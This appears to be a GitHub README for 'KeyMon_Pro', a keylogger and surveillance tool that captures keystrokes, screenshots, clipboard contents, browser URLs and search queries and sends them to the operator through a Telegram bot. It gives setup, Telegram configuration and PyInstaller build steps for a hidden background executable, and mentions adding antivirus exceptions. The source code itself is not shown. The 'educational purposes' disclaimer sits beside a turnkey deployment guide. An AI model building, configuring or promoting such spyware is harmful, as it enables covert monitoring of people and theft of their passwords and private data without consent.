# KeyMon_Pro - Advanced keylogger monitoring tool with Telegram bot integration
## 📖 Overview
KeyMon_Pro is an educational tool designed to study system monitoring techniques in controlled environments. This project aims to help security students understand input monitoring mechanisms, data flow patterns, and potential system vulnerabilities.

## ⚠️ Important Notice
This software is strictly for **educational and research purposes** only. It must be used exclusively in controlled, isolated virtual environments with explicit consent. Any use outside of authorized research environments is prohibited.

## 📁 Project Structure

```
KeyMon_Pro/
├── assets/             
├── build/              
├── dist/               
├── logs/               
├── src/                
│   ├── __init__.py
│   ├── browser_monitor.py
│   ├── central_logger.py
│   ├── clipboard_monitor.py
│   ├── gui.py
│   ├── keylogger.py
│   ├── process_monitor.py
│   ├── screenshot.py
│   └── telegram_reporter.py
├── config.spec
├── monitor.spec
├── file_version_info.txt
├── README.md
└── requirements.txt
```

## 🎯 Features

### 1. ⌨️ Input Monitoring
- Real-time keystroke capture and logging
- Active window context tracking
- Special key event detection (Ctrl, Alt, Function keys)
- Multi-language keyboard support
- Modifier key combination logging
- Structured data output with timestamps
- Application-specific input tracking

### 2. 📸 Visual Context Capture
- Automated screenshot capture system
- Configurable capture intervals (default: 5 seconds)
- Multiple monitor support
- Active window focus detection
- Image compression for storage efficiency
- Timestamp correlation with keylog events
- Screenshot organization by session

### 3. 📋 Clipboard Analysis
- Real-time clipboard content monitoring
- Support for multiple data formats:
  - Plain text
  - Rich text (RTF)
  - Images
  - Files
  - HTML content
- Clipboard change event detection
- Source application tracking
- Content hash verification

### 4. 💻 Process Monitoring
- Active process enumeration
- Window title tracking
- Browser activity monitoring:
  - URL logging
  - Search queries
  - Active tab tracking
- Application focus duration
- Process start/end timestamps
- Parent-child process relationship tracking

### 5. 📁 Data Management
- Structured logging system
- JSON-formatted output
- Automatic log rotation
- Data compression
- Secure storage practices
- Configurable retention policies
- Export capabilities


### 📦 Dependencies
pynput>=1.7.6
opencv-python>=4.10.0
pyperclip>=1.8.2
pillow>=9.0.0
psutil>=5.9.0
cryptography>=3.4.7

## 📦 Installation Guide

### 1. Environment Setup
```bash
# Clone the repository
git clone https://github.com/yourusername/KeyMon_Pro.git
cd KeyMon_Pro

# Create virtual environment
python -m venv keylogger_env

# Activate virtual environment
# Windows:
keylogger_env\Scripts\activate
# Unix/MacOS:
source keylogger_env/bin/activate

# Install dependencies
pip install -r requirements.txt

# Run gui.py to launch the GUI
python gui.py  

# enter your telegram bot token and chat id in the gui.py file

# 1. Create a Telegram bot:
#    - Open Telegram and search for @BotFather
#    - Send /newbot command and follow instructions
#    - Save the bot token and name provided

# 2. Get your chat ID:
#    - Search for https://t.me/GetMyChatID_Bot
#    - Start the bot and save the chat ID it provides

# 3. Configure the application:
#    - Launch GUI
#    - Enter your bot token and chat ID
#    - Select monitoring options and features
#    - Click save config then start monitoring
```
![image](https://github.com/user-attachments/assets/24abf430-a200-4b74-90dd-93d773e8ead8)

## 🔨 Building Executable Files

### Prerequisites
- Ensure all dependencies are installed:
```bash
pip install -r requirements.txt
```

### Building Process
The project uses PyInstaller to create two executable files:

1. **Monitor Service** (Background Process):
```bash
pyinstaller monitor.spec
```
This creates `keymon_monitor.exe` - the core monitoring service.

2. **Configuration GUI**:
```bash
pyinstaller config.spec
```
This creates `keymon_config.exe` - the configuration interface.

### Executable Files
After building, you'll find two executables in the `dist` directory:

1. **keymon_monitor.exe**
   - Core monitoring service
   - Runs in background
   - Handles:
     - Keylogging
     - Screenshot capture
     - Browser history monitoring
     - Process monitoring
     - Clipboard tracking

2. **keymon_config.exe**
   - Configuration GUI
   - Used to:
     - Set up Telegram notifications
     - Configure monitoring options
     - View logs and status
     - Control the monitor service

### Running the Application

1. **First Run**:
   - Launch `keymon_config.exe`
   - Configure Telegram bot settings:
     - Enter bot token
     - Enter chat ID
   - Set monitoring preferences
   - Click "Start Monitoring"

2. **Subsequent Usage**:
   - The monitor service (`keymon_monitor.exe`) runs automatically
   - Use `keymon_config.exe` to adjust settings or view logs

### Important Notes
- Both executables require administrator privileges
- Files are digitally signed for research purposes
- Antivirus software may need exceptions added
- Use only in controlled research environments
- Keep executables in their original directory structure

### 🚀 Starting the Monitor
```bash
python gui.py --log-level debug
```

### 📊 Log Analysis Tools
```bash
# Generate analysis report
python tools/analyze_logs.py --input logs/keylog_20240324.log

# Export data to CSV
python tools/export_data.py --format csv --output analysis.csv
```


### 🤝 Contributing
1. Fork the repository
2. Create feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit changes (`git commit -m 'Add AmazingFeature'`)
4. Push to branch (`git push origin feature/AmazingFeature`)
5. Open Pull Request



### 🤝 Responsible Use
- Educational purposes only
- Controlled environment testing
- No malicious applications
- Regular security audits

## 🐛 Troubleshooting

### Common Issues
1. Permission errors
   - Solution: Run with administrative privileges
2. Capture failures
   - Solution: Check process isolation settings
3. Performance issues
   - Solution: Adjust capture intervals

### Support
- Open issues on GitHub
- Documentation wiki
- Research community forum

## License
This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.


## Contact
- Project Lead: Bereket Takiso


## Version History
- v1.0.0 - Initial release




